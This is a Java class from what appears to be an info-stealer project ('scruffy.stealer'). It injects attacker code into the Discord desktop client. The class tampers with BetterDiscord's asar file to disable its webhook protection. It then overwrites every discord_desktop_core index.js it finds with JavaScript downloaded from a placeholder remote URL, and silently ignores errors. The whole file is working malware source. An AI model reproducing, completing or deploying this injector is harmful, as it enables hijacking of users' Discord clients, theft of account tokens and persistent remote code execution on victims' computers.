package scruffy.stealer.impl.inject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;

import org.apache.commons.io.FileUtils;
import org.jsoup.Jsoup;

import scruffy.stealer.utils.utilities;

public class discord_injector extends utilities {

    private static final String URL_TO_READ = "raw link of the javascript code to be injected";

    public void initialize() {
    	handleBetterDiscord();
    	handleDiscordDirectories();
    }

    private void handleBetterDiscord() {
        File betterDiscordDir = new File(System.getenv("appdata") + "/BetterDiscord/data");
        if (betterDiscordDir.isDirectory()) {
            Arrays.asList(betterDiscordDir.listFiles(File::isFile))
            	.forEach(file -> {
	            	if ("betterdiscord.asar".equals(file.getName())) {
	            		try {
	            			String data = FileUtils.readFileToString(file, "utf-8");
	            			FileUtils.writeStringToFile(file, data.replace("api/webhook", "itzgonza"), "utf-8");
	            		} catch (Exception ignored) {}
	            	}
	            });
        }
    }

    private void handleDiscordDirectories() {
        File[] discordDirectories = new File(System.getenv("localappdata")).listFiles(File::isDirectory);
        if (discordDirectories != null) {
            Arrays.stream(discordDirectories).filter(dir -> dir.getName().contains("iscord"))
	            .forEach(this::processDiscordDirectory);
        }
    }

    private void processDiscordDirectory(File discordDirectory) {
        Arrays.stream(discordDirectory.listFiles(File::isDirectory)).filter(subdir -> subdir.getName().contains("app-"))
        	.forEach(subdir -> {
                File[] paths = subdir.listFiles(File::isDirectory);
                
                for (File path : paths) {
                    Arrays.stream(path.listFiles(File::isDirectory)).filter(coreDir -> coreDir.getName().contains("discord_desktop_core")).forEach(this::modifyIndexJS);
                }
        	});
    }

    private void modifyIndexJS(File coreDir) {
        for (File file : coreDir.listFiles((dir, name) -> name.contains("index.js"))) {
            try {
                String content = read(URL_TO_READ);
                if (content != null) {
                    FileUtils.write(file, content, "utf-8");
                }
            } catch (Exception ignored) {}
        }
    }

    private String read(String link) throws Exception {
        StringBuilder response = new StringBuilder();

        HttpURLConnection con = (HttpURLConnection) new URL(link).openConnection();
        con.setRequestMethod("GET");

        BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            response.append(line);
        }
        
        return Jsoup.parse(response.toString()).text();
    }
}
